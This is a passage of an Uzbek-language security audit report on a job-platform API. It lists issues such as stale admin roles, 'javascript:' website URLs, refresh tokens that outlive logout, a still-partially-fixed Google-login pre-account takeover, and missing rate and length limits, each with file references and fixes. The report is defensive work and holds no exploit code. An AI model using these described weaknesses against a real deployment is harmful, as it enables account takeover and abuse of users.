- **Recommended fix:** 1) admin.routes.ts adminOnly'ni `requireStaff("admin")` ga almashtiring (bitta indexed findUnique, admin trafigi kichik). 2) realtime.ts'ga `closeUserSockets(userId)` qo'shib block handler'da chaqiring; chat WS'da xabar yuborishdan oldin `isBlocked` ni tekshiring (yoki tokenVersion). 3) Ixtiyoriy: WS'da 15 daqiqada bir `exp` tekshirib yopish (frontend useChatSocket allaqachon token o'zgarganda qayta ulanadi).
- **Dependencies:** #6 tokenVersion bo'lsa requireStaff o'rniga shuni tekshirish ham mumkin.
- **Risk:** Past: admin so'rovlariga +1 DB o'qish; WS yopilsa mijoz backoff bilan qayta ulanadi (useChatSocket.ts:44-49) — bloklangan bo'lsa verify o'tmaydi.
- **Bajarilgan fix:** Admin yo'llari `requireStaff("admin")` (bazadagi rol); bloklash/rol o'zgarishi seanslarni bekor qiladi va WS'ni yopadi. PHASE 6: `requireAuth` barcha autentifikatsiyalangan yo'llarda bazadan rol, blok va token versiyasini tekshiradi (ISSUE-108, D-036).
- **Test/dalil:** e2e `[ISSUE-035]` va `[ISSUE-041/035]` PASS; PHASE 6: e2e `[PHASE6-V5]` (2 ta) PASS
- **Birlashtirilgan manbalar (4):**
  - R068 [auth, P2] `apps/api/src/modules/admin/admin.routes.ts:19` — Bloklash/rol o'zgarishi 15 daqiqagacha kuchga kirmaydi; admin yo'llari tokendagi rolga ishonadi; ochiq WebSocket'lar yopilmaydi
  - R076 [authz-idor, P2] `apps/api/src/modules/admin/admin.routes.ts:19` — Admin paneli requireRole (token roli) bilan himoyalangan — team/articles esa requireStaff (bazadagi rol + blok); demoted/bloklangan admin 15 daqiqa to'liq huquq bilan qoladi
  - R179 [security-surface, P2] `apps/api/src/modules/admin/admin.routes.ts:19` — Admin panel (moderatsiya, bloklash, rol berish, broadcast) token'dagi rolga ishonadi — DB'dagi joriy rol/blok tekshirilmaydi
  - R194 [tests-infra, P2] `apps/api/src/common/auth-guard.ts:12` — Bloklangan oddiy user (seeker/employer) access token muddati (15 daq) tugaguncha barcha API va WS'dan foydalanaveradi; test faqat staff uchun

### ISSUE-036

**Ariza holati: bir xil holat takror yuborilsa har safar tarix va bildirishnoma yaratiladi; holat mashinasi yo'q**

- **Severity:** P2 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** employer/applications
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:229`
- **Root cause:** statusSchema 4 ta holatdan istalganini qabul qiladi, joriy `application.status` bilan hech qanday qoida yoki no-op tekshiruvi yo'q. Har chaqiruvda history yozuvi va nomzodga notify yaratiladi.
- **Impact:** Rad etilgan nomzodga 'Ko'rildi 👀' yoki 'Suhbatga taklif' bildirishnomasi boradi, qabul qilingan esa jimgina rad etiladi. Bir xil holat qayta yuborilsa (masalan ikki tab yoki qayta urinish) statusHistory'da takror yozuv va takror email/Telegram/push chiqadi. Frontend select ham har qanday holatni taklif qiladi (ApplicationSidebar.tsx:86), faqat joriy holat bilan tenglikni bloklaydi (79, 104).
- **Evidence:** applications.routes.ts:18-21 statusSchema; 217-240: holatni o'qib, shartsiz update + history; 262-276: har doim notify. ApplicationSidebar.tsx:62-65, 127: quick action'lar faqat joriy holatni yashiradi.
- **Recommended fix:** 1) `if (status === application.status) return application;` (history ham notify ham yo'q). 2) Minimal allowed-map: sent→{viewed,invited,rejected,accepted}; viewed→{invited,rejected,accepted}; invited→{accepted,rejected}; rejected→{invited} (qayta ko'rib chiqish ruxsat bo'lsa); accepted→{} yoki {rejected}; 'viewed'ga faqat 'sent'dan o'tiladi. Boshqa o'tishlar 409 qaytaradi. Frontend SETTABLE_STATUSES ro'yxati joriy holatga qarab shu map bo'yicha filtrlanadi.
- **Dependencies:** lib/employer/applications/adapter.ts SETTABLE_STATUSES, ApplicationSidebar.tsx, markViewed (EmployerApplicationsView.tsx:127-134) 409'ni to'g'ri qayta ishlasin.
- **Risk:** O'rta: product qaysi o'tishlarga ruxsat berishini hal qilishi kerak. e2e'ga yangi check qo'shish kerak.
- **Lead auditor izohi:** Severity P1→P2: boshqa o'tishlar (fikrni o'zgartirish) product qarori sifatida ochiq qoldiriladi.
- **Bajarilgan fix:** Bir xil holat — no-op (tarix va bildirishnoma yo'q) (D-019).
- **Test/dalil:** e2e `[ISSUE-036/014/060]` PASS
- **Birlashtirilgan manbalar (3):**
  - R036 [employer-product, P1] `apps/api/src/modules/applications/applications.routes.ts:229` — Ariza holati o'tishlari tekshirilmaydi: rejected→viewed/invited, accepted→rejected va bir xil holatga qayta o'rnatish ham ruxsat
  - R077 [authz-idor, P2] `apps/api/src/modules/applications/applications.routes.ts:229` — PATCH /api/applications/:id/status — holat mashinasi yo'q (istalgan → istalgan, takroriy), har safar tarix + bildirishnoma; admin suhbatda 'employer' bo'lib qoladi
  - R198 [validation-errors, P2] `apps/api/src/modules/applications/applications.routes.ts:215` — Ariza holati o'tishlari tekshirilmaydi — istalgan holatdan istalgan holatga, takroriy holat ham tarixga yoziladi

### ISSUE-037

**Ish beruvchi ikkinchi kompaniya yarata oladi (POST /api/companies tekshirmaydi, javascript: website), hamma joyda orderBy'siz findFirst**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** data-integrity
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:211`
- **Root cause:** 211–221 da mavjud kompaniya tekshirilmaydi; `createCompanySchema` (22–29) `stir`, `legalName` ni oladi (PUT /api/employer/company 31–39 olmaydi), `website: z.string().url()` `javascript:`/`data:` sxemalarini o'tkazadi (PUT esa normalizeWebsite 42–46 bilan https majburlaydi). Egalik har joyda `company.findFirst({ ownerUserId })` orderBy'siz: vacancies.routes.ts:136, companies.routes.ts:73/88/130/164, candidates.routes.ts:238, chat.routes.ts:150, billing.routes.ts:56/76/108. Telefon tasdiqlash talab qilinmaydi.
- **Impact:** Bepul employer hisobidan cheksiz ochiq kompaniya sahifalari (`/companies/:slug`, sitemap-employer.xml ga tushadi — seo.routes.ts:515) — SEO spam; ikkinchi kompaniyani boshqarish/o'chirish endpoint'i yo'q (yetim yozuvlar). `website` frontend'da `<a href>` (CompanySidebar.tsx:22, target=_blank noopener — ta'sir cheklangan). Ko'p kompaniyali employer'da vakansiya bitta, profil boshqa kompaniyaga tushishi mumkin (Mongo natural order).
- **Evidence:** companies.routes.ts:211-221 — `existing` tekshiruvi yo'q; :27 `website: z.string().url().optional()`; apps/web/src grep `api/companies"` POST — chaqiruv yo'q.
- **Recommended fix:** Minimal: 215 dan keyin `if (await prisma.company.findFirst({ where: { ownerUserId } })) throw Errors.conflict("Sizda allaqachon kompaniya bor")`; `website: normalizeWebsite(body.website)`; `preHandler` ga `requirePhoneVerified`. Yoki endpoint'ni butunlay olib tashlab PUT /api/employer/company ni yagona yo'l qilish. Barcha `findFirst({ ownerUserId })` ga `orderBy: { createdAt: "asc" }`.
- **Dependencies:** seed/demo skriptlari POST /api/companies ni ishlatmasligini tekshirish (prisma to'g'ridan-to'g'ri).
- **Risk:** Past.
- **Lead auditor izohi:** Empirik: ikkinchi kompaniya 201.
- **Bajarilgan fix:** Ikkinchi kompaniya 409; sayt manzili faqat http(s) domen; `findFirst` lar `orderBy createdAt`.
- **Test/dalil:** e2e `[ISSUE-037]` PASS
- **Birlashtirilgan manbalar (4):**
  - R082 [authz-idor, P2] `apps/api/src/modules/companies/companies.routes.ts:211` — POST /api/companies (frontend ishlatmaydi) — employer cheksiz kompaniya yaratadi, stir/legalName va `javascript:` website qabul qiladi; hamma joyda `findFirst` — qaysi kompaniya 'meniki' aniqmas
  - R101 [data-scale, P2] `apps/api/src/modules/companies/companies.routes.ts:601` — Bitta employer'da bir nechta Company yaratilishi mumkin (ownerUserId unique emas), keyin findFirst tartibsiz ixtiyoriy kompaniyani qaytaradi
  - R130 [employer-product, P2] `apps/api/src/modules/companies/companies.routes.ts:211` — Employer bir nechta kompaniya yarata oladi; barcha yo'llar findFirst'ni orderBy'siz ishlatadi, shuning uchun qaysi kompaniya tanlanishi noaniq
  - R264 [security-surface, P3] `apps/api/src/modules/companies/companies.routes.ts:27` — createCompanySchema `website: z.string().url()` `javascript:`/`data:` sxemalarini qabul qiladi; register'da firstName/lastName/password max uzunlik yo'q

### ISSUE-038

**Sevimlilarga draft/moderation/rejected vakansiyani qo'shib, uning mazmunini GET /api/favorites orqali o'qish mumkin**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** authz/content
- **Fayl:** `apps/api/src/modules/favorites/favorites.routes.ts:77`
- **Root cause:** 77–81 faqat mavjudlik tekshiradi (`select: { id: true }`), status filtrsiz. GET /api/favorites (20–47) vakansiyaning title/salary/company/region'ini statusdan qat'i nazar qaytaradi (`isClosed` faqat belgi). `vacancyId` ObjectId formati tekshirilmagan (companyParams kabi `objectId()` yo'q) → 500.
- **Impact:** Nomzod ID orqali (ObjectId'lar vaqt+counter — qisman taxminlanadi, employer applications javobida `vacancy.id` bor) hali e'lon qilinmagan yoki rad etilgan vakansiyaning sarlavhasi, maoshi, kompaniyasini ko'radi; ochiq `/api/vacancies/:slug` esa 404 beradi — ikki qoida zid.
- **Evidence:** favorites.routes.ts:77-81 `prisma.vacancy.findUnique({ where: { id: vacancyId }, select: { id: true } })`; :26-44 select'da `status` bor, filtr yo'q.
- **Recommended fix:** POST: `where: { id: vacancyId, status: "active" }` (`findFirst`); params zod `objectId()`. GET: `where: { userId, vacancy: { status: { in: ["active", "archived"] } } }` — arxivlangan qoladi (UI 'yopilgan' deb ko'rsatadi), draft/rejected chiqmaydi.
- **Dependencies:** Yo'q.
- **Risk:** Past.
- **Bajarilgan fix:** Faqat faol e'lonni saqlash mumkin; ro'yxatda faqat faol/yopilgan e'lonlar; params zod.
- **Test/dalil:** e2e `[ISSUE-034/038]` va saqlanganlar tekshiruvlari PASS
- **Birlashtirilgan manbalar (2):**
  - R083 [authz-idor, P2] `apps/api/src/modules/favorites/favorites.routes.ts:77` — POST /api/favorites/:vacancyId — draft/moderation/rejected vakansiyani ham 'sevimli' qilib, uning mazmunini GET /api/favorites orqali o'qish mumkin
  - R088 [candidate-public, P2] `apps/api/src/modules/favorites/favorites.routes.ts:76` — Nomzod endpointlarida ObjectId validatsiyasi yo'q (500) va rezyume massivlari cheklanmagan

### ISSUE-039

**Ish beruvchi ariza bermagan va ish qidirmayotgan nomzodga ham suhbat ochadi, keyin /api/users/:id/summary orqali profilini ko'radi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** privacy/chat
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:146`
- **Root cause:** `POST /api/conversations/start` (146–151): faqat `candidate.role === "job_seeker"` tekshiriladi — ariza, isOpenToWork, rezyume talab qilinmaydi; `admin` roli ham employer sifatida suhbat yaratadi (kompaniyasiz). `/api/users/:id/summary` (400–412) 'oramizda suhbat bor' shartiga tayanadi, lekin suhbatni employer o'zi yaratadi → shart bo'sh. Summary `isOpenToWork=false` va draft rezyumeni ham beradi (417–426). Nomzod ID'lari `GET /api/companies/:slug` reviews.userId (companies.routes.ts:189) va /api/candidates dan olinadi.
- **Impact:** Ish beruvchi salbiy sharh yozgan nomzodni userId orqali topib, unga to'g'ridan-to'g'ri yozadi (retaliation), ish qidirmayotgan (isOpenToWork=false) nomzodning ism/skill/rezyume sarlavhasini ko'radi. Spam vektori (requirePhoneVerified yumshatadi, ammo bitta tasdiqlangan telefon yetarli).
- **Evidence:** chat.routes.ts:146-151; :400-412 `conversation.findFirst({ OR: [...] })` → `if (!conv) throw forbidden`; :420-424 `resumes: { take: 1 }` status filtrsiz; companies.routes.ts:189 `userId: true`.
- **Recommended fix:** start: employer uchun `candidateUserId` ga ruxsat sharti: (a) nomzod ushbu employer kompaniyasi vakansiyasiga ariza bergan (`application.findFirst({ jobSeekerId, vacancy: { company: { ownerUserId: me } } })`) YOKI (b) `jobSeekerProfile.isOpenToWork && resumes.some({status:"published"})`. Admin rolini start'dan chiqarish (yoki alohida 'support' oqimi). summary: `resumes.where.status = "published"`. Public sharhlarda `userId` ni olib tashlash.
- **Dependencies:** 7-topilma (reviews.userId); frontend EmployerApplicationsView.tsx:181 (arizachi uchun — (a) sharti bilan ishlaydi), CompanyActions.tsx (seeker→company — o'zgarmaydi).
- **Risk:** O'rta — /employer/candidates sahifasidan 'yozish' tugmasi (b) shartiga mos bo'lishi kerak.
- **Bajarilgan fix:** Ish beruvchi faqat ish qidirayotgan, ariza yuborgan yoki oldin suhbatlashgan nomzodga yozadi; summary'da faqat chop etilgan rezyume. PHASE 6: Suhbat javoblarida email yo'q (ISSUE-104).
- **Test/dalil:** e2e `[ISSUE-039]` PASS

### ISSUE-040

**WebSocket: maxPayload 100 MB, xabar rate-limit yo'q, blok holati va token muddati tekshirilmaydi, heartbeat yo'q, tana turi tekshirilmaydi**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** security/websocket
- **Fayl:** `apps/api/src/common/realtime.ts:38`
- **Root cause:** addSocket/removeSocket faqat `close` hodisasiga tayanadi (chat.routes.ts:136). Mobil uyqu, NAT timeout, tarmoq uzilishi FIN yubormaydi → socket soatlab `readyState=1` ko'rinishi mumkin. `grep ping|pong|heartbeat` — API'da yo'q. `ws.on("error")` ham yo'q.
- **Impact:** chat.routes.ts:128 `!isOnline(otherId)` false qaytaradi → oflayn foydalanuvchiga Telegram xabari bormaydi; sendToUser o'lik socketlarga yozadi; uzoq muddatda Set'lar o'sadi (xotira).
- **Evidence:** realtime.ts:12-40; chat.routes.ts:127-133, 136.
- **Recommended fix:** chat.routes'da `ws.isAlive=true; ws.on('pong', …)`; server-level 30s interval: `isAlive=false; ws.ping()`, javob bo'lmasa `ws.terminate()` (close → removeSocket). `ws.on('error', () => removeSocket(...))` qo'shish.
- **Dependencies:** Yo'q
- **Risk:** Past
- **Bajarilgan fix:** WS: token bucket, blok tekshiruvi (4403), 4401, token muddatida yopish, heartbeat, ulanish darhol ro'yxatga olinadi (D-022).
- **Test/dalil:** e2e `[ISSUE-003/040]`, WS clientId, `[ISSUE-041/035]` PASS
- **Birlashtirilgan manbalar (6):**
  - R149 [realtime-notifications, P2] `apps/api/src/common/realtime.ts:38` — Heartbeat (ping/pong) yo'q — o'lik socketlar map'da qoladi, `isOnline` yolg'on true → Telegram fallback ishlamaydi
  - R153 [realtime-notifications, P2] `apps/api/src/modules/chat/chat.routes.ts:71` — WS uchun payload limiti, rate-limit va isBlocked tekshiruvi yo'q
  - R181 [security-surface, P2] `apps/api/src/modules/chat/chat.routes.ts:71` — WebSocket: maxPayload 100MB (ws default), xabar/ulanish rate-limit yo'q, token muddati va blok holati qayta tekshirilmaydi
  - R195 [tests-infra, P2] `apps/api/src/modules/chat/chat.routes.ts:77` — WebSocket: maxPayload yo'q (ws default 100MiB), auth xatosida close code yo'q, blocked/phone tekshiruvi yo'q, xabar rate-limit yo'q; e2e faqat happy-path
  - R269 [validation-errors, P3] `apps/api/src/modules/chat/chat.routes.ts:108` — WS xabar tanasi tipi tekshirilmaydi — obyekt/massiv `String()` orqali "[object Object]" sifatida saqlanadi
  - R080 [authz-idor, P2] `apps/api/src/modules/chat/chat.routes.ts:76` — WS access token URL query'da — Fastify request log'iga to'liq yoziladi; WS xabar yuborishda blok/telefon tasdiqlash/limit tekshiruvi yo'q

### ISSUE-041

**Refresh token server tomonda bekor qilinmaydi: logout'dan keyin eski cookie yangi token beradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** security/session
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:90`
- **Root cause:** logout (auth.routes.ts:90-93) faqat clearCookie. refreshSession (auth.service.ts:257-270) yangi refresh beradi, lekin eskisi 30 kun davomida yaroqli qoladi (JWT stateless, DB'da hech qanday versiya/jti yo'q — schema.prisma:160-200 User'da tokenVersion yo'q). "Barcha qurilmalardan chiqish" yo'q.
- **Impact:** O'g'irlangan/nusxalangan refresh cookie (XSS emas — httpOnly, lekin qurilma/backup/proxy log orqali) foydalanuvchi logout qilganidan keyin ham 30 kun ishlaydi. Parol o'zgarganda (kelajakda #4) eski seanslar uzilmaydi. Admin blok — refresh'da tekshiriladi (267), bu yaxshi.
- **Evidence:** apps/api/src/modules/auth/auth.routes.ts:90-93; apps/api/src/modules/auth/auth.service.ts:257-277; apps/api/prisma/schema.prisma:160-200.
- **Recommended fix:** Backward-compatible minimal: User'ga `tokenVersion Int @default(0)`; signRefreshToken payload'iga `v`; refreshSession'da `payload.v !== user.tokenVersion` -> 401; logout'da (agar refresh cookie yaroqli bo'lsa) tokenVersion++ ("shu qurilma" uchun jti-list kerak bo'lsa keyin). Eski `v`siz tokenlar: `payload.v ?? 0` deb qabul qiling (migratsiyasiz). Parol reset/admin blok'da ham tokenVersion++.
- **Dependencies:** prisma db push; #4 va #5 shu mexanizmga tayanadi. Bitta tokenVersion++ barcha qurilmalarni chiqaradi — UX'da "barcha qurilmalardan chiqish" deb ko'rsating.
- **Risk:** Past: `v` yo'q eski tokenlar 0 deb qabul qilinadi, mavjud seanslar uzilmaydi.
- **Lead auditor izohi:** Empirik: logout'dan keyin eski cookie bilan /refresh → 200 + accessToken.
- **Bajarilgan fix:** `tokenVersion`: logout barcha refresh tokenlarni bekor qiladi (D-009). PHASE 6: Eskirgan cookie bilan logout joriy seansni bekor qilmaydi; access token ham darhol bekor bo'ladi (ISSUE-123, ISSUE-108).
- **Test/dalil:** e2e `[ISSUE-041/035]` PASS; PHASE 6: e2e `[PHASE6-U11]` PASS
- **Birlashtirilgan manbalar (2):**
  - R069 [auth, P2] `apps/api/src/modules/auth/auth.routes.ts:90` — Refresh token server tomonda bekor qilinmaydi: logout faqat cookie'ni tozalaydi, rotatsiya eski tokenni yaroqli qoldiradi
  - R180 [security-surface, P2] `apps/api/src/modules/auth/auth.service.ts:110` — Refresh token stateless (30 kun), bekor qilish ro'yxati yo'q — logout/parol o'zgarishi o'g'irlangan cookie'ni to'xtatmaydi

### ISSUE-042

**Email tasdiqlanmaydi; Google login email bo'yicha mavjud (tasdiqlanmagan) hisobga birlashadi — pre-account takeover**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** security/auth
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:317`
- **Root cause:** registerUser (auth.service.ts:175-198) `isEmailVerified` ni false qoldiradi va tasdiq oqimi yo'q. googleLogin (317-321) verified Google email bilan `findUnique({ email })` topsa, hisob kimniki va qanday yaratilganidan qat'i nazar sessiya beradi.
- **Impact:** Hujumchi jabrlanuvchining email'i bilan oldindan parol qo'yib ro'yxatdan o'tadi (409 faqat mavjud bo'lsa). Jabrlanuvchi keyin "Google bilan davom etish" ni bossa — hujumchi yaratgan hisobga kiradi; hujumchi parol bilan o'sha hisobga doimiy kirish saqlab qoladi (rezyume, arizalar, chatlar). Bundan tashqari begona email bilan ro'yxatdan o'tish notification/mailer spam manbai.
- **Evidence:** apps/api/src/modules/auth/auth.service.ts:175-198 (isEmailVerified yo'q), 313-321 (email bo'yicha merge, tasdiq tekshirilmaydi).
- **Recommended fix:** Minimal: googleLogin'da `existing.isEmailVerified === false` bo'lsa merge qilmasdan 409 `EMAIL_UNVERIFIED` qaytaring (yoki parolni tasodifiy hash bilan almashtirib eski sessiyalarni tokenVersion bilan uzing va isEmailVerified=true qiling). To'liq: register'dan keyin email tasdiqlash xati (invite naqshi), tasdiqlanmagan hisobga Google merge'ni taqiqlash.
- **Dependencies:** #4 (reset infratuzilmasi) va #6 (tokenVersion) bilan bir xil token jadvali/mexanizmi.
- **Risk:** Past-o'rta: mavjud parol-hisobi bor foydalanuvchi Google bilan kirmoqchi bo'lsa xabar oladi — UX matni 3 tilda kerak.
- **Bajarilgan fix:** Google tokeninfo: 5 s timeout, `iss` tekshiruvi, ism uzunligi. Hisob birlashtirish (pre-account takeover xavfi) saqlandi — email tasdiqlashsiz yechim yo'q (D-011).
- **Test/dalil:** API typecheck/build PASS; Google bilan e2e yo'q

### ISSUE-043

**Yuklash endpointlarida alohida rate-limit yo'q, fayl turi faqat client sarlavhasidan (magic bytes yo'q), multipart bo'lmagan so'rov 406**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** security/uploads
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:126`
- **Root cause:** Global limit 600 so'rov/min (server.ts:103, env RATE_LIMIT_MAX default 600); strict limit faqat login/register/google/telegram-start (auth.routes.ts:55), support (5/min), team invites, articles helpful (20/min). Logo (companies.routes.ts:126), rezyume PDF (profile.routes.ts:95), maqola muqovasi (articles.admin.routes.ts:289) — har biri 5MB gacha, disk'ka yoziladi; `/api/auth/refresh` (auth.routes.ts:74), `/api/auth/telegram/poll` (:115), `/api/conversations/start` (chat.routes.ts:140), `/api/vacancies/:id/apply` — umumiy limitda.
- **Impact:** Bitta employer daqiqasiga ~3GB (600×5MB) yozib Railway Volume'ni to'ldiradi; eski logo o'chirilsa ham rezyume/muqova eskilari qolib ketadi (profile.routes.ts'da eski fayl o'chirilmaydi). Refresh endpoint'iga 600/min — refresh token brute-force amaliy emas, lekin DB'ga (auth.service.ts:118) keraksiz yuk.
- **Evidence:** server.ts:103 `rateLimit, { max: env.RATE_LIMIT_MAX, timeWindow: "1 minute" }`; companies.routes.ts:126-157, profile.routes.ts:95-121, articles.admin.routes.ts:289-306 — `config.rateLimit` yo'q; grep bo'yicha rateLimit config faqat 4 joyda.
- **Recommended fix:** Upload route'larga `{ config: { rateLimit: { max: 5, timeWindow: "1 minute" } } }`; refresh/poll'ga 30/min; write-endpoint'lar (apply, conversations/start, reviews) 20/min. Profile resume upload'da eski faylni o'chirish (companies.routes.ts:147-151 namunasi) va DELETE'da unlink.
- **Dependencies:** trustProxy fix'i bilan birga ma'noli (aks holda XFF bilan chetlab o'tiladi)
- **Risk:** Past
- **Bajarilgan fix:** Yuklash yo'llarida 20/min limit, magic bytes, multipart bo'lmagan so'rov 400.
- **Test/dalil:** e2e `[ISSUE-029/043]`, `[ISSUE-002]`, jamoa muqova tekshiruvi PASS
- **Birlashtirilgan manbalar (2):**
  - R182 [security-surface, P2] `apps/api/src/modules/companies/companies.routes.ts:126` — Upload va boshqa og'ir endpoint'larda alohida rate-limit yo'q (600/min umumiy × 5MB)
  - R200 [validation-errors, P2] `apps/api/src/modules/profile/profile.routes.ts:313` — Fayl yuklashda multipart bo'lmagan so'rov 406 beradi, noto'g'ri mimetype'da stream iste'mol qilinmaydi

### ISSUE-044

**Satr uzunliklari (title, description, password, ism, coverLetter, qidiruv matni) va sonlar (Infinity) cheklanmagan; rezyume massivlari cheksiz**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** api/validation
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:42`
- **Root cause:** Faqat Fastify default bodyLimit (1MB) chegara. Cheklanmagan: vacancies.routes.ts:42-45 `title: z.string().min(3)`, `description: min(10)`, `requirements`, `conditions`; :22-23 `text`, `categorySlug` (query); auth.routes.ts:13-17 `email`, `password: min(8)`, `firstName`, `lastName` (:23 login `password: min(1)`); applications.routes.ts:14 `coverLetter`; companies.routes.ts:255-261 `name`, `legalName`, `stir`, `description`; chat.routes.ts:46 `companySlug`; candidates.routes.ts:24-25 `text` (zod umuman yo'q). Taqqoslash: alerts.routes.ts:139 `text: max(200)`, admin.routes.ts:22 `max(120)`, resume.routes.ts barcha maydon max bilan.
- **Impact:** 1MB gacha sarlavha/tavsif saqlanadi, Meilisearch'ga indekslanadi (`syncVacancyIndex`), SSR sahifa, sitemap/OG rasm (og.routes.ts:273-278 `renderVacancyOgImage({ title })`) va bildirishnomalar matniga tushadi; 1MB parol argon2 hash/verify'ga (auth.service.ts:33; login) — CPU yuki (rate-limit 10/min faqat yumshatadi). Qidiruv `text` uzun bo'lsa `contains` regex 5 maydon × 6 term (vacancies.service.ts:101-127) — sekin so'rov.
- **Evidence:** vacancies.routes.ts:42 `title: z.string().min(3),` :43 `description: z.string().min(10),`; auth.routes.ts:14 `password: z.string().min(8),`; applications.routes.ts:14 `coverLetter: z.string().optional(),`; candidates.routes.ts:24 `const query = req.query as { text?: string; region?: string };`.
- **Recommended fix:** `.trim().max(N)` qo'shing: title 160, description/requirements/conditions 10_000, coverLetter 4000 (chat body bilan mos), email 254, password 128 (team.routes.ts:227 kabi), firstName/lastName 60 (profile.routes.ts bilan mos), company name 160/legalName 200/stir 20/description 2000, query `text` 200, `categorySlug` 80; candidates uchun zod sxema (`text max 100`, `region: objectId().optional()`).
- **Dependencies:** Frontend formalarida mos maxLength (VacancyForm, signup) — ixtiyoriy
- **Risk:** Past — mavjud haqiqiy ma'lumot chegaralardan kichik; edit'da eski uzun yozuv bo'lsa 400 chiqishi mumkin (limitni yetarli katta tanlang)
- **Lead auditor izohi:** Empirik: 200 KB sarlavha 201, 20 KB parol va 50 KB ism bilan ro'yxatdan o'tish 200.
- **Bajarilgan fix:** Sarlavha/tavsif/parol/ism/coverLetter/qidiruv matni uzunliklari va rezyume massivlari cheklandi; URL'dagi buzilgan sonlar e'tiborsiz qoladi.
- **Test/dalil:** e2e `[ISSUE-044]` PASS
- **Birlashtirilgan manbalar (5):**
  - R201 [validation-errors, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:42` — Bir qator zod sxemalarida satr uzunligi cheklanmagan (title/description/requirements/conditions, coverLetter, email/password/firstName/lastName, company maydonlari, qidiruv `text`)
  - R202 [validation-errors, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:27` — `z.coerce.number()` salary/salaryTo/page/pageSize `.int()/.finite()/.max()` siz — Infinity va juda katta qiymatlar Prisma xatosi (500) yoki behuda og'ir so'rovga olib keladi
  - R206 [auth, P3] `apps/api/src/modules/auth/auth.routes.ts:14` — Parol siyosati: register'da max yo'q (invite'da 128), kuchlilik/keng tarqalgan parol tekshiruvi yo'q; "Eslab qolish" checkbox dekorativ; login timing oracle
  - R207 [auth, P3] `apps/api/src/modules/auth/auth.routes.ts:16` — Register'da firstName/lastName uzunligi cheklanmagan; email max yo'q
  - R132 [employer-product, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:150` — Route va query ID'lari ObjectId sifatida tekshirilmaydi: noto'g'ri ID Prisma xatosi orqali 500 beradi; coverLetter uzunligi cheklanmagan

### ISSUE-045

**GET /api/employer/applications chegarasiz: relation-filter $lookup, har arizaga to'liq rezyume; filtr va sahifalash client'da**

- **Severity:** P2 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** scale/api
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:128`
- **Root cause:** findMany'da take/skip yo'q; include ichida resume.experience/education/skills, statusHistory, jobSeeker.profile.region, vacancy._count.applications. where esa ikki bosqichli relation filtr (`vacancy.company.ownerUserId`) — Prisma Mongo buni $lookup pipeline orqali bajaradi (applications→vacancies→companies), Application tomonida ownerUserId bo'yicha hech qanday indeks ishlamaydi.
- **Impact:** 50k ariza miqyosida yirik ish beruvchi (bir necha ming ariza) uchun bitta so'rov 5–10 MB JSON qaytaradi, 6+ ta ichki Prisma so'rovi ($in ro'yxatlari minglab id bilan), sahifa sekin ochiladi yoki timeout — asosiy employer flow. Vacancy._count har ariza uchun takror hisoblanadi (Prisma Mongo'da _count qanday bajarilishi — low confidence).
- **Evidence:** applications.routes.ts:128-177: `prisma.application.findMany({ where: { vacancy: { company: { ownerUserId } } }, include: { vacancy: {..., _count: { select: { applications: true } } }, statusHistory: {...}, jobSeeker: {...}, resume: { include: { experience, education, skills } } }, orderBy: { createdAt: 'desc' } })` — take yo'q. schema.prisma:465-467: Application indekslari faqat [vacancyId,jobSeekerId], [jobSeekerId], [resumeId].
- **Recommended fix:** 1) Avval `company.findFirst({ ownerUserId })` (indeks ownerUserId) → `vacancy.findMany({ companyId, select:{id} })` (indeks companyId) → `application.findMany({ vacancyId: { in: ids } })` (unique [vacancyId,jobSeekerId] prefiksi ishlaydi). 2) `page/pageSize` (max 50) + `vacancyId`/`status` filtri, `{ items, total, page }` qaytarish. 3) Ro'yxatda rezyumedan faqat `{ id, title, skills (max 10) }` — to'liq rezyume alohida `GET /api/applications/:id` (owner tekshiruvi bilan). 4) Vacancy applicationCount'ni bir marta `application.groupBy({ by:['vacancyId'] })` bilan olish. 5) `@@index([vacancyId, createdAt])` yoki [vacancyId, status].
- **Dependencies:** Frontend apps/web/src/pages/employer/applications/+Page.tsx (items massivi, resume maydonlari) va e2e-check.mjs'dagi tekshiruvlar sahifalashga moslanishi kerak.
- **Risk:** O'rta: javob shakli o'zgaradi (paginated); eski klientlar `items` ni to'liq deb kutsa qisqa ro'yxat ko'radi. Backward-compat uchun `page` berilmasa default 50 va `hasMore` qaytarish mumkin.
